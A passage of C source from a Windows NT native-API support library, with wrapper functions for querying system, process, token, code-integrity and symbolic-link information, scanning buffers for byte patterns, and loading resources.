    if (NT_SUCCESS(ntStatus)) {
        return buffer;
    }

    FreeMem(buffer);
    return NULL;
}

/*
* ntsupGetSystemInfo
*
* Purpose:
*
* Returns buffer with system information by given SystemInformationClass.
*
* Returned buffer must be freed with ntsupHeapFree after usage.
*
*/
PVOID ntsupGetSystemInfo(
    _In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
    _Out_opt_ PULONG ReturnLength
)
{
    return ntsupGetSystemInfoEx(
        SystemInformationClass,
        ReturnLength,
        (PNTSUPMEMALLOC)ntsupHeapAlloc,
        (PNTSUPMEMFREE)ntsupHeapFree);
}

/*
* ntsupResolveSymbolicLink
*
* Purpose:
*
* Resolve symbolic link target and copy it to the supplied buffer.
*
* Return FALSE on any error.
*
*/
BOOL ntsupResolveSymbolicLink(
    _In_opt_ HANDLE RootDirectoryHandle,
    _In_ PUNICODE_STRING LinkName,
    _Inout_ LPWSTR Buffer,
    _In_ DWORD cbBuffer //size of buffer in bytes
)
{
    BOOL                bResult = FALSE;
    HANDLE              linkHandle = NULL;
    DWORD               cLength = 0;
    NTSTATUS            ntStatus;
    UNICODE_STRING      infoUString;
    OBJECT_ATTRIBUTES   objectAttr;

    if ((cbBuffer == 0) || (Buffer == NULL)) {
        RtlSetLastWin32Error(ERROR_INVALID_PARAMETER);
        return bResult;
    }

    InitializeObjectAttributes(&objectAttr,
        LinkName, OBJ_CASE_INSENSITIVE, RootDirectoryHandle, NULL);

    ntStatus = NtOpenSymbolicLinkObject(&linkHandle,
        SYMBOLIC_LINK_QUERY,
        &objectAttr);

    if (!NT_SUCCESS(ntStatus) || (linkHandle == NULL)) {
        RtlSetLastWin32Error(RtlNtStatusToDosError(ntStatus));
        return bResult;
    }

    cLength = (DWORD)(cbBuffer - sizeof(UNICODE_NULL));
    if (cLength >= MAX_USTRING) {
        cLength = MAX_USTRING - sizeof(UNICODE_NULL);
    }

    infoUString.Buffer = Buffer;
    infoUString.Length = (USHORT)cLength;
    infoUString.MaximumLength = (USHORT)(cLength + sizeof(UNICODE_NULL));

    ntStatus = NtQuerySymbolicLinkObject(linkHandle,
        &infoUString,
        NULL);

    bResult = (NT_SUCCESS(ntStatus));
    NtClose(linkHandle);
    return bResult;
}

/*
* ntsupQueryThreadWin32StartAddress
*
* Purpose:
*
* Lookups thread win32 start address.
*
*/
BOOL ntsupQueryThreadWin32StartAddress(
    _In_ HANDLE ThreadHandle,
    _Out_ PULONG_PTR Win32StartAddress
)
{
    ULONG returnLength;
    NTSTATUS ntStatus;
    ULONG_PTR win32StartAddress = 0;

    ntStatus = NtQueryInformationThread(
        ThreadHandle,
        ThreadQuerySetWin32StartAddress,
        &win32StartAddress,
        sizeof(ULONG_PTR),
        &returnLength);

    if (Win32StartAddress)
        *Win32StartAddress = win32StartAddress;

    return NT_SUCCESS(ntStatus);
}

/*
* ntsupOpenDirectoryEx
*
* Purpose:
*
* Open directory handle with DIRECTORY_QUERY access, with root directory support.
*
*/
_Success_(return)
NTSTATUS ntsupOpenDirectoryEx(
    _Out_ PHANDLE DirectoryHandle,
    _In_opt_ HANDLE RootDirectoryHandle,
    _In_ PUNICODE_STRING DirectoryName,
    _In_ ACCESS_MASK DesiredAccess
)
{
    NTSTATUS          ntStatus;
    HANDLE            directoryHandle = NULL;
    OBJECT_ATTRIBUTES objectAttrbutes;

    InitializeObjectAttributes(&objectAttrbutes,
        DirectoryName, OBJ_CASE_INSENSITIVE, RootDirectoryHandle, NULL);

    ntStatus = NtOpenDirectoryObject(&directoryHandle,
        DesiredAccess,
        &objectAttrbutes);

    *DirectoryHandle = directoryHandle;

    return ntStatus;
}

/*
* ntsupOpenDirectory
*
* Purpose:
*
* Open directory handle with DIRECTORY_QUERY access, with root directory support.
*
*/
NTSTATUS ntsupOpenDirectory(
    _Out_ PHANDLE DirectoryHandle,
    _In_opt_ HANDLE RootDirectoryHandle,
    _In_ LPCWSTR DirectoryName,
    _In_ ACCESS_MASK DesiredAccess
)
{
    UNICODE_STRING usName;

    RtlInitUnicodeString(&usName, DirectoryName);
    return ntsupOpenDirectoryEx(DirectoryHandle, RootDirectoryHandle, &usName, DesiredAccess);
}

/*
* ntsupQueryProcessName
*
* Purpose:
*
* Lookups process name by given process ID.
*
* If nothing found return FALSE.
*
*/
BOOL ntsupQueryProcessName(
    _In_ ULONG_PTR dwProcessId,
    _In_ PVOID ProcessList,
    _Inout_ LPWSTR Buffer,
    _In_ DWORD ccBuffer //size of buffer in chars
)
{
    ULONG NextEntryDelta = 0, iteration = 0;

    union {
        PSYSTEM_PROCESS_INFORMATION Process;
        PBYTE ListRef;
    } List;

    List.ListRef = (PBYTE)ProcessList;

    do {

        List.ListRef += NextEntryDelta;

        if ((ULONG_PTR)List.Process->UniqueProcessId == dwProcessId) {

            _strncpy(
                Buffer,
                ccBuffer,
                List.Process->ImageName.Buffer,
                List.Process->ImageName.Length / sizeof(WCHAR));

            return TRUE;
        }

        NextEntryDelta = List.Process->NextEntryDelta;
        if (++iteration > MAX_NTSUP_PROCESS_ENUM_ITER)
            break;

    } while (NextEntryDelta);

    return FALSE;
}

/*
* ntsupQueryProcessEntryById
*
* Purpose:
*
* Lookups process entry by given process id.
*
* If nothing found return FALSE.
*
*/
BOOL ntsupQueryProcessEntryById(
    _In_ HANDLE UniqueProcessId,
    _In_ PVOID ProcessList,
    _Out_ PSYSTEM_PROCESS_INFORMATION* Entry
)
{
    ULONG NextEntryDelta = 0, iteration = 0;

    union {
        PSYSTEM_PROCESS_INFORMATION Process;
        PBYTE ListRef;
    } List;

    List.ListRef = (PBYTE)ProcessList;

    *Entry = NULL;

    do {

        List.ListRef += NextEntryDelta;

        if (List.Process->UniqueProcessId == UniqueProcessId) {
            *Entry = List.Process;
            return TRUE;
        }

        NextEntryDelta = List.Process->NextEntryDelta;
        if (++iteration > MAX_NTSUP_PROCESS_ENUM_ITER)
            break;

    } while (NextEntryDelta);

    return FALSE;
}

/*
* ntsupQueryProcessImageFileNameByProcessId
*
* Purpose:
*
* Query image path for given process id in NT format.
*
* Use FreeMem to release allocated buffer.
*
*/
NTSTATUS ntsupQueryProcessImageFileNameByProcessId(
    _In_ HANDLE UniqueProcessId,
    _Out_ PUNICODE_STRING ProcessImageFileName,
    _In_ PNTSUPMEMALLOC AllocMem,
    _In_ PNTSUPMEMFREE FreeMem
)
{
    NTSTATUS ntStatus;
    SYSTEM_PROCESS_ID_INFORMATION processData;

    processData.ProcessId = UniqueProcessId;
    processData.ImageName.Length = 0;
    processData.ImageName.MaximumLength = 256;

    do {

        processData.ImageName.Buffer = (PWSTR)AllocMem(processData.ImageName.MaximumLength);
        if (processData.ImageName.Buffer == NULL)
            return STATUS_INSUFFICIENT_RESOURCES;

        ntStatus = NtQuerySystemInformation(SystemProcessIdInformation,
            (PVOID)&processData,
            sizeof(SYSTEM_PROCESS_ID_INFORMATION),
            NULL);

        if (!NT_SUCCESS(ntStatus))
            FreeMem(processData.ImageName.Buffer);

    } while (ntStatus == STATUS_INFO_LENGTH_MISMATCH);

    if (!NT_SUCCESS(ntStatus))
        return ntStatus;

    *ProcessImageFileName = processData.ImageName;

    return ntStatus;
}

/*
* ntsupQuerySystemObjectInformationVariableSize
*
* Purpose:
*
* Generic object information query routine.
*
* Use FreeMem to release allocated buffer.
*
*/
NTSTATUS ntsupQuerySystemObjectInformationVariableSize(
    _In_ PFN_NTQUERYROUTINE QueryRoutine,
    _In_opt_ HANDLE ObjectHandle,
    _In_ DWORD InformationClass,
    _Out_ PVOID* Buffer,
    _Out_opt_ PULONG ReturnLength,
    _In_ PNTSUPMEMALLOC AllocMem,
    _In_ PNTSUPMEMFREE FreeMem
)
{
    NTSTATUS ntStatus;
    PVOID queryBuffer;
    ULONG returnLengthLocal = 0;

    *Buffer = NULL;
    if (ReturnLength) *ReturnLength = 0;

    ntStatus = QueryRoutine(ObjectHandle,
        InformationClass,
        NULL,
        0,
        &returnLengthLocal);

    //
    // Test all possible acceptable failures.
    //
    if (ntStatus != STATUS_BUFFER_OVERFLOW &&
        ntStatus != STATUS_BUFFER_TOO_SMALL &&
        ntStatus != STATUS_INFO_LENGTH_MISMATCH)
    {
        return ntStatus;
    }

    if (returnLengthLocal == 0 || returnLengthLocal > MAX_NTSUP_BUFFER_SIZE)
        return STATUS_INVALID_BUFFER_SIZE;

    queryBuffer = AllocMem(returnLengthLocal);
    if (queryBuffer == NULL)
        return STATUS_INSUFFICIENT_RESOURCES;

    ntStatus = QueryRoutine(ObjectHandle,
        InformationClass,
        queryBuffer,
        returnLengthLocal,
        &returnLengthLocal);

    if (NT_SUCCESS(ntStatus)) {
        *Buffer = queryBuffer;
        if (ReturnLength) *ReturnLength = returnLengthLocal;
    }
    else {
        FreeMem(queryBuffer);
    }

    return ntStatus;
}

/*
* ntsupQueryVsmProtectionInformation
*
* Purpose:
*
* Query VSM protection information.
*
*/
BOOLEAN ntsupQueryVsmProtectionInformation(
    _Out_ PBOOLEAN pbDmaProtectionsAvailable,
    _Out_ PBOOLEAN pbDmaProtectionsInUse,
    _Out_ PBOOLEAN pbHardwareMbecAvailable,
    _Out_ PBOOLEAN pbApicVirtualizationAvailable
)
{
    NTSTATUS ntStatus;
    ULONG returnLength;
    SYSTEM_VSM_PROTECTION_INFORMATION svpi;

    if (pbDmaProtectionsAvailable) *pbDmaProtectionsAvailable = FALSE;
    if (pbDmaProtectionsInUse) *pbDmaProtectionsInUse = FALSE;
    if (pbHardwareMbecAvailable) *pbHardwareMbecAvailable = FALSE;
    if (pbApicVirtualizationAvailable) *pbApicVirtualizationAvailable = FALSE;

    RtlSecureZeroMemory(&svpi, sizeof(SYSTEM_VSM_PROTECTION_INFORMATION));

    ntStatus = NtQuerySystemInformation(
        SystemVsmProtectionInformation,
        &svpi,
        sizeof(SYSTEM_VSM_PROTECTION_INFORMATION),
        &returnLength);

    if (NT_SUCCESS(ntStatus)) {
        if (pbDmaProtectionsAvailable) *pbDmaProtectionsAvailable = svpi.DmaProtectionsAvailable;
        if (pbDmaProtectionsInUse) *pbDmaProtectionsInUse = svpi.DmaProtectionsInUse;
        if (pbHardwareMbecAvailable) *pbHardwareMbecAvailable = svpi.HardwareMbecAvailable;
        if (pbApicVirtualizationAvailable) *pbApicVirtualizationAvailable = svpi.ApicVirtualizationAvailable;
        return TRUE;
    }
    else {
        RtlSetLastWin32Error(RtlNtStatusToDosError(ntStatus));
    }

    return FALSE;
}

/*
* ntsupQueryHVCIState
*
* Purpose:
*
* Query HVCI/IUM state.
*
*/
BOOLEAN ntsupQueryHVCIState(
    _Out_ PBOOLEAN pbHVCIEnabled,
    _Out_ PBOOLEAN pbHVCIStrictMode,
    _Out_ PBOOLEAN pbHVCIIUMEnabled
)
{
    BOOLEAN hvciEnabled;
    ULONG returnLength;
    NTSTATUS ntStatus;
    SYSTEM_CODEINTEGRITY_INFORMATION ci;

    if (pbHVCIEnabled) *pbHVCIEnabled = FALSE;
    if (pbHVCIStrictMode) *pbHVCIStrictMode = FALSE;
    if (pbHVCIIUMEnabled) *pbHVCIIUMEnabled = FALSE;

    ci.Length = sizeof(ci);

    ntStatus = NtQuerySystemInformation(
        SystemCodeIntegrityInformation,
        &ci,
        sizeof(ci),
        &returnLength);

    if (NT_SUCCESS(ntStatus)) {

        hvciEnabled = ((ci.CodeIntegrityOptions & CODEINTEGRITY_OPTION_ENABLED) &&
            (ci.CodeIntegrityOptions & CODEINTEGRITY_OPTION_HVCI_KMCI_ENABLED));

        if (pbHVCIEnabled)
            *pbHVCIEnabled = hvciEnabled;

        if (pbHVCIStrictMode)
            *pbHVCIStrictMode = (hvciEnabled == TRUE) &&
            (ci.CodeIntegrityOptions & CODEINTEGRITY_OPTION_HVCI_KMCI_STRICTMODE_ENABLED);

        if (pbHVCIIUMEnabled)
            *pbHVCIIUMEnabled = (ci.CodeIntegrityOptions & CODEINTEGRITY_OPTION_HVCI_IUM_ENABLED) > 0;

        return TRUE;
    }
    else {
        RtlSetLastWin32Error(RtlNtStatusToDosError(ntStatus));
    }

    return FALSE;
}

/*
* ntsupLookupImageSectionByName
*
* Purpose:
*
* Lookup section pointer and size for section name.
*
*/
PVOID ntsupLookupImageSectionByName(
    _In_ CHAR* SectionName,
    _In_ ULONG SectionNameLength,
    _In_ PVOID DllBase,
    _Out_ PULONG SectionSize
)
{
    BOOLEAN bFound = FALSE;
    ULONG i;
    PVOID Section;
    IMAGE_NT_HEADERS* NtHeaders = RtlImageNtHeader(DllBase);
    IMAGE_SECTION_HEADER* SectionTableEntry;

    //
    // Assume failure.
    //
    if (SectionSize)
        *SectionSize = 0;

    if (NtHeaders == NULL)
        return NULL;

    SectionTableEntry = (PIMAGE_SECTION_HEADER)((PCHAR)NtHeaders +
        sizeof(ULONG) +
        sizeof(IMAGE_FILE_HEADER) +
        NtHeaders->FileHeader.SizeOfOptionalHeader);

    //
    // Locate section.
    //
    i = NtHeaders->FileHeader.NumberOfSections;
    while (i > 0) {

        if (_strncmp_a(
            (CHAR*)SectionTableEntry->Name,
            SectionName,
            SectionNameLength) == 0)
        {
            bFound = TRUE;
            break;
        }

        i -= 1;
        SectionTableEntry += 1;
    }

    //
    // Section not found, abort scan.
    //
    if (!bFound)
        return NULL;

    Section = (PVOID)((ULONG_PTR)DllBase + SectionTableEntry->VirtualAddress);
    if (SectionSize)
        *SectionSize = SectionTableEntry->Misc.VirtualSize;

    return Section;
}

/*
* ntsupFindPattern
*
* Purpose:
*
* Lookup pattern in buffer.
*
*/
PVOID ntsupFindPattern(
    _In_ CONST PBYTE Buffer,
    _In_ SIZE_T BufferSize,
    _In_ CONST PBYTE Pattern,
    _In_ SIZE_T PatternSize
)
{
    PBYTE p0 = Buffer, pnext;

    if (PatternSize == 0)
        return NULL;

    if (BufferSize < PatternSize)
        return NULL;

    do {
        pnext = (PBYTE)memchr(p0, Pattern[0], BufferSize);
        if (pnext == NULL)
            break;

        BufferSize -= (ULONG_PTR)(pnext - p0);

        if (BufferSize < PatternSize)
            return NULL;

        if (memcmp(pnext, Pattern, PatternSize) == 0)
            return pnext;

        p0 = pnext + 1;
        --BufferSize;
    } while (BufferSize > 0);

    return NULL;
}

/*
* ntsupFindPatternEx
*
* Purpose:
*
* Lookup pattern in buffer with specified mask.
*
*/
DWORD ntsupFindPatternEx(
    _In_ PATTERN_SEARCH_PARAMS* SearchParams
)
{
    PBYTE   p;
    DWORD   c, i, n;
    BOOLEAN found;
    BYTE    low, high;

    DWORD   bufferSize;

    if (SearchParams == NULL)
        return 0;

    if ((SearchParams->PatternSize == 0) || (SearchParams->PatternSize > SearchParams->BufferSize))
        return 0;

    bufferSize = SearchParams->BufferSize - SearchParams->PatternSize;

    for (n = 0, p = SearchParams->Buffer, c = 0; c <= bufferSize; ++p, ++c)
    {
        found = 1;
        for (i = 0; i < SearchParams->PatternSize; ++i)
        {
            low = p[i] & 0x0f;
            high = p[i] & 0xf0;

            if (SearchParams->Mask[i] & 0xf0)
            {
                if (high != (SearchParams->Pattern[i] & 0xf0))
                {
                    found = 0;
                    break;
                }
            }

            if (SearchParams->Mask[i] & 0x0f)
            {
                if (low != (SearchParams->Pattern[i] & 0x0f))
                {
                    found = 0;
                    break;
                }
            }

        }

        if (found) {

            if (SearchParams->Callback(p,
                SearchParams->PatternSize,
                SearchParams->CallbackContext))
            {
                return n + 1;
            }

            n++;
        }
    }

    return n;
}

/*
* ntsupOpenProcess
*
* Purpose:
*
* NtOpenProcess wrapper.
*
*/
NTSTATUS ntsupOpenProcess(
    _In_ HANDLE UniqueProcessId,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE ProcessHandle
)
{
    NTSTATUS ntStatus;
    HANDLE processHandle = NULL;
    OBJECT_ATTRIBUTES objectAttributes = RTL_INIT_OBJECT_ATTRIBUTES((PUNICODE_STRING)NULL, 0);
    CLIENT_ID ClientId;

    ClientId.UniqueProcess = UniqueProcessId;
    ClientId.UniqueThread = NULL;

    ntStatus = NtOpenProcess(
        &processHandle,
        DesiredAccess,
        &objectAttributes,
        &ClientId);

    if (NT_SUCCESS(ntStatus)) {
        *ProcessHandle = processHandle;
    }

    return ntStatus;
}

/*
* ntsupOpenThread
*
* Purpose:
*
* NtOpenThread wrapper.
*
*/
NTSTATUS ntsupOpenThread(
    _In_ PCLIENT_ID ClientId,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE ThreadHandle
)
{
    NTSTATUS ntStatus;
    HANDLE threadHandle = NULL;
    OBJECT_ATTRIBUTES objectAttributes = RTL_INIT_OBJECT_ATTRIBUTES((PUNICODE_STRING)NULL, 0);

    ntStatus = NtOpenThread(
        &threadHandle,
        DesiredAccess,
        &objectAttributes,
        ClientId);

    if (NT_SUCCESS(ntStatus)) {
        *ThreadHandle = threadHandle;
    }

    return ntStatus;
}

/*
* ntsupCICustomKernelSignersAllowed
*
* Purpose:
*
* Return license state if present (EnterpriseG).
*
*/
NTSTATUS ntsupCICustomKernelSignersAllowed(
    _Out_ PBOOLEAN bAllowed)
{
    NTSTATUS ntStatus;
    ULONG uLicense = 0, dataSize;
    UNICODE_STRING usLicenseValue = RTL_CONSTANT_STRING(L"CodeIntegrity-AllowConfigurablePolicy-CustomKernelSigners");

    *bAllowed = FALSE;

    ntStatus = NtQueryLicenseValue(
        &usLicenseValue,
        NULL,
        (PVOID)&uLicense,
        sizeof(DWORD),
        &dataSize);

    if (NT_SUCCESS(ntStatus)) {
        *bAllowed = (uLicense != 0);
    }
    return ntStatus;
}

/*
* ntsupPrivilegeEnabled
*
* Purpose:
*
* Tests if the given token has the given privilege enabled/enabled by default.
*
*/
NTSTATUS ntsupPrivilegeEnabled(
    _In_ HANDLE ClientToken,
    _In_ ULONG Privilege,
    _Out_ LPBOOL pfResult
)
{
    NTSTATUS status;
    PRIVILEGE_SET Privs;
    BOOLEAN bResult = FALSE;

    Privs.Control = PRIVILEGE_SET_ALL_NECESSARY;
    Privs.PrivilegeCount = 1;
    Privs.Privilege[0].Luid.LowPart = Privilege;
    Privs.Privilege[0].Luid.HighPart = 0;
    Privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED_BY_DEFAULT | SE_PRIVILEGE_ENABLED;

    status = NtPrivilegeCheck(ClientToken, &Privs, &bResult);

    *pfResult = bResult;

    return status;
}

/*
* ntsupQueryEnvironmentVariableOffset
*
* Purpose:
*
* Return offset to the given environment variable.
*
*/
LPWSTR ntsupQueryEnvironmentVariableOffset(
    _In_ PUNICODE_STRING Value
)
{
    UNICODE_STRING   str1;
    PWCHAR           ptrEnvironment;
    ULONG            scanCount = 0;

    ptrEnvironment = (PWCHAR)RtlGetCurrentPeb()->ProcessParameters->Environment;

    do {
        if (*ptrEnvironment == 0 || scanCount++ > MAX_NTSUP_ENV_SCAN)
            return 0;

        RtlInitUnicodeString(&str1, ptrEnvironment);
        if (RtlPrefixUnicodeString(Value, &str1, TRUE))
            break;

        ptrEnvironment += _strlen(ptrEnvironment) + 1;

    } while (1);

    return (ptrEnvironment + Value->Length / sizeof(WCHAR));
}

/*
* ntsupExpandEnvironmentStrings
*
* Purpose:
*
* Reimplemented ExpandEnvironmentStrings.
*
*/
DWORD ntsupExpandEnvironmentStrings(
    _In_ LPCWSTR lpSrc,
    _Out_writes_to_opt_(nSize, return) LPWSTR lpDst,
    _In_ DWORD nSize
)
{
    NTSTATUS ntStatus;
    SIZE_T srcLength = 0, returnLength = 0, dstLength = (SIZE_T)nSize;

    if (lpSrc) {
        srcLength = _strlen(lpSrc);
    }

    ntStatus = RtlExpandEnvironmentStrings(
        NULL,
        (PWSTR)lpSrc,
        srcLength,
        (PWSTR)lpDst,
        dstLength,
        &returnLength);

    if ((NT_SUCCESS(ntStatus)) || (ntStatus == STATUS_BUFFER_TOO_SMALL)) {

        if (returnLength <= MAXDWORD32)
            return (DWORD)returnLength;

        ntStatus = STATUS_UNSUCCESSFUL;
    }
    RtlSetLastWin32Error(RtlNtStatusToDosError(ntStatus));
    return 0;
}

/*
* ntsupIsUserHasInteractiveSid
*
* Purpose:
*
* pbInteractiveSid will be set to TRUE if current user has interactive sid, FALSE otherwise.
*
* Function return operation status code.
*
*/
NTSTATUS ntsupIsUserHasInteractiveSid(
    _In_ HANDLE hToken,
    _Out_ PBOOL pbInteractiveSid)
{
    BOOL isInteractiveSid = FALSE;
    NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;
    HANDLE heapHandle = NtCurrentPeb()->ProcessHeap;
    ULONG neededLength = 0;

    DWORD i;

    SID_IDENTIFIER_AUTHORITY SidAuth = SECURITY_NT_AUTHORITY;
    PSID pInteractiveSid = NULL;
    PTOKEN_GROUPS groupInfo = NULL;

    do {

        ntStatus = NtQueryInformationToken(
            hToken,
            TokenGroups,
            NULL,
            0,
            &neededLength);

        if (ntStatus != STATUS_BUFFER_TOO_SMALL)
            break;

        groupInfo = (PTOKEN_GROUPS)RtlAllocateHeap(
            heapHandle,
            HEAP_ZERO_MEMORY,
            neededLength);

        if (groupInfo == NULL)
            break;

        ntStatus = NtQueryInformationToken(
            hToken,
            TokenGroups,
            groupInfo,
            neededLength,
            &neededLength);

        if (!NT_SUCCESS(ntStatus))
            break;

        ntStatus = RtlAllocateAndInitializeSid(
            &SidAuth,
            1,
            SECURITY_INTERACTIVE_RID,
            0, 0, 0, 0, 0, 0, 0,
            &pInteractiveSid);

        if (!NT_SUCCESS(ntStatus))
            break;

        for (i = 0; i < groupInfo->GroupCount; i++) {

            if (RtlEqualSid(
                pInteractiveSid,
                groupInfo->Groups[i].Sid))
            {
                isInteractiveSid = TRUE;
                break;
            }
        }

    } while (FALSE);

    if (groupInfo != NULL)
        RtlFreeHeap(heapHandle, 0, groupInfo);

    if (pbInteractiveSid)
        *pbInteractiveSid = isInteractiveSid;

    if (pInteractiveSid)
        RtlFreeSid(pInteractiveSid);

    return ntStatus;
}

/*
* ntsupIsLocalSystem
*
* Purpose:
*
* pbResult will be set to TRUE if current account is run by system user, FALSE otherwise.
*
* Function return operation status code.
*
*/
NTSTATUS ntsupIsLocalSystem(
    _Out_ PBOOL pbResult)
{
    BOOL                            bResult = FALSE;

    NTSTATUS                        ntStatus;
    HANDLE                          tokenHandle = NULL;
    HANDLE                          heapHandle = NtCurrentPeb()->ProcessHeap;

    ULONG                           neededLength = 0;

    PSID                            systemSid = NULL;
    PTOKEN_USER                     ptu = NULL;
    SID_IDENTIFIER_AUTHORITY        ntAuthority = SECURITY_NT_AUTHORITY;

    ntStatus = NtOpenProcessToken(
        NtCurrentProcess(),
        TOKEN_QUERY,
        &tokenHandle);

    if (NT_SUCCESS(ntStatus)) {

        ntStatus = NtQueryInformationToken(
            tokenHandle,
            TokenUser,
            NULL,
            0,
            &neededLength);

        if (ntStatus == STATUS_BUFFER_TOO_SMALL) {

            ptu = (PTOKEN_USER)RtlAllocateHeap(
                heapHandle,
                HEAP_ZERO_MEMORY,
                neededLength);

            if (ptu) {

                ntStatus = NtQueryInformationToken(
                    tokenHandle,
                    TokenUser,
                    ptu,
                    neededLength,
                    &neededLength);

                if (NT_SUCCESS(ntStatus)) {

                    ntStatus = RtlAllocateAndInitializeSid(
                        &ntAuthority,
                        1,
                        SECURITY_LOCAL_SYSTEM_RID,
                        0, 0, 0, 0, 0, 0, 0,
                        &systemSid);

                    if (NT_SUCCESS(ntStatus)) {

                        bResult = RtlEqualSid(
                            ptu->User.Sid,
                            systemSid);

                        RtlFreeSid(systemSid);
                    }

                }
                RtlFreeHeap(heapHandle, 0, ptu);
            }
            else {
                ntStatus = STATUS_INSUFFICIENT_RESOURCES;
            }
        } //STATUS_BUFFER_TOO_SMALL
        NtClose(tokenHandle);
    }

    if (pbResult)
        *pbResult = bResult;

    return ntStatus;
}

/*
* ntsupGetProcessElevationType
*
* Purpose:
*
* Returns process elevation type.
*
*/
BOOL ntsupGetProcessElevationType(
    _In_opt_ HANDLE ProcessHandle,
    _Out_ TOKEN_ELEVATION_TYPE * lpType
)
{
    HANDLE tokenHandle = NULL, processHandle = ProcessHandle;
    NTSTATUS ntStatus;
    ULONG returnedLength = 0;
    TOKEN_ELEVATION_TYPE tokenType = TokenElevationTypeDefault;

    if (ProcessHandle == NULL) {
        processHandle = GetCurrentProcess();
    }

    ntStatus = NtOpenProcessToken(processHandle, TOKEN_QUERY, &tokenHandle);
    if (NT_SUCCESS(ntStatus)) {

        ntStatus = NtQueryInformationToken(
            tokenHandle,
            TokenElevationType,
            &tokenType,
            sizeof(TOKEN_ELEVATION_TYPE),
            &returnedLength);

        NtClose(tokenHandle);
    }

    if (lpType)
        *lpType = tokenType;

    return (NT_SUCCESS(ntStatus));
}

/*
* ntsupIsProcessElevated
*
* Purpose:
*
* Returns process elevation state.
*
*/
NTSTATUS ntsupIsProcessElevated(
    _In_ ULONG ProcessId,
    _Out_ PBOOL Elevated)
{
    NTSTATUS ntStatus;
    ULONG returnedLength;
    HANDLE processHandle = NULL, tokenHandle = NULL;
    TOKEN_ELEVATION tokenInfo;

    if (Elevated) *Elevated = FALSE;

    ntStatus = ntsupOpenProcess(
        UlongToHandle(ProcessId),
        MAXIMUM_ALLOWED,
        &processHandle);

    if (NT_SUCCESS(ntStatus)) {

        ntStatus = NtOpenProcessToken(processHandle, TOKEN_QUERY, &tokenHandle);
        if (NT_SUCCESS(ntStatus)) {

            tokenInfo.TokenIsElevated = 0;
            ntStatus = NtQueryInformationToken(
                tokenHandle,
                TokenElevation,
                &tokenInfo,
                sizeof(TOKEN_ELEVATION),
                &returnedLength);

            if (NT_SUCCESS(ntStatus)) {

                if (Elevated)
                    *Elevated = (tokenInfo.TokenIsElevated > 0);

            }

            NtClose(tokenHandle);
        }
        NtClose(processHandle);
    }

    return ntStatus;
}

/*
* ntsupPurgeSystemCache
*
* Purpose:
*
* Flush file cache and memory standby list.
*
*/
VOID ntsupPurgeSystemCache(
    VOID
)
{
    SYSTEM_FILECACHE_INFORMATION sfc;
    SYSTEM_MEMORY_LIST_COMMAND smlc;

    //flush file system cache
    if (ntsupEnablePrivilege(SE_INCREASE_QUOTA_PRIVILEGE, TRUE)) {
        RtlSecureZeroMemory(&sfc, sizeof(SYSTEM_FILECACHE_INFORMATION));
        sfc.MaximumWorkingSet = (SIZE_T)-1;
        sfc.MinimumWorkingSet = (SIZE_T)-1;
        NtSetSystemInformation(SystemFileCacheInformation, (PVOID)&sfc, sizeof(sfc));
    }

    //flush standby list
    if (ntsupEnablePrivilege(SE_PROF_SINGLE_PROCESS_PRIVILEGE, TRUE)) {
        smlc = MemoryPurgeStandbyList;
        NtSetSystemInformation(SystemMemoryListInformation, (PVOID)&smlc, sizeof(smlc));
    }
}

/*
* ntsupGetSystemRoot
*
* Purpose:
*
* Return system root directory silo session aware.
*
*/
PWSTR ntsupGetSystemRoot(
    VOID
)
{
    PEB* peb = NtCurrentPeb();

    if (peb->SharedData && peb->SharedData->ServiceSessionId)
        return peb->SharedData->NtSystemRoot;
    else
        return USER_SHARED_DATA->NtSystemRoot;
}

/*
* ntsupGetProcessDebugObject
*
* Purpose:
*
* Reference process debug object.
*
*/
NTSTATUS ntsupGetProcessDebugObject(
    _In_ HANDLE ProcessHandle,
    _Out_ PHANDLE DebugObjectHandle
)
{
    return NtQueryInformationProcess(
        ProcessHandle,
        ProcessDebugObjectHandle,
        DebugObjectHandle,
        sizeof(HANDLE),
        NULL);
}

/*
* ntsupQueryResourceData
*
* Purpose:
*
* Load resource by given id (win32 FindResource, SizeofResource, LockResource).
*
*/
PBYTE ntsupQueryResourceData(
    _In_ ULONG_PTR ResourceId,
    _In_ PVOID DllHandle,
    _In_ PULONG DataSize
)
{
    NTSTATUS                   ntStatus;
    ULONG_PTR                  idPath[3];
    IMAGE_RESOURCE_DATA_ENTRY* dataEntry;
    PBYTE                      dataPtr = NULL;
    ULONG                      dataSize = 0;

    if (DataSize) {
        *DataSize = 0;
    }

    if (DllHandle != NULL) {

        idPath[0] = (ULONG_PTR)RT_RCDATA; //type
        idPath[1] = ResourceId;           //id
        idPath[2] = 0;                    //lang

        ntStatus = LdrFindResource_U(DllHandle, (ULONG_PTR*)&idPath, 3, &dataEntry);
        if (NT_SUCCESS(ntStatus)) {
            ntStatus = LdrAccessResource(DllHandle, dataEntry, (PVOID*)&dataPtr, &dataSize);
            if (NT_SUCCESS(ntStatus)) {
                if (DataSize) {
                    *DataSize = dataSize;
                }
            }
        }
    }
    return dataPtr;
}

/*
* ntsupEnableWow64Redirection
*
* Purpose:
*
* Enable/Disable Wow64 redirection.
*
*/
NTSTATUS ntsupEnableWow64Redirection(
    _In_ BOOLEAN bEnable
)
{
    PVOID OldValue = NULL, Value;

    Value = IntToPtr(bEnable);
    return RtlWow64EnableFsRedirectionEx(Value, &OldValue);
}

/*
* ntsupDetectObjectCallback
*
* Purpose:
*
* Comparer callback routine used in objects enumeration.
*
*/
NTSTATUS NTAPI ntsupDetectObjectCallback(
    _In_ POBJECT_DIRECTORY_INFORMATION Entry,
    _In_ PVOID CallbackParam
)
{
    POBJSCANPARAM Param = (POBJSCANPARAM)CallbackParam;

    if (Entry == NULL) {
        return STATUS_INVALID_PARAMETER_1;
    }

    if (CallbackParam == NULL) {
        return STATUS_INVALID_PARAMETER_2;
    }

    if (Param->Buffer == NULL || Param->BufferSize == 0) {
        return STATUS_MEMORY_NOT_ALLOCATED;
    }

    if (Entry->Name.Buffer) {
        if (_strcmpi_w(Entry->Name.Buffer, Param->Buffer) == 0) {
            return STATUS_SUCCESS;
        }
    }
    return STATUS_UNSUCCESSFUL;
}

/*
* ntsupEnumSystemObjects
*
* Purpose:
*
* Lookup object by name in given directory.
*
*/
NTSTATUS NTAPI ntsupEnumSystemObjects(
    _In_opt_ LPCWSTR pwszRootDirectory,
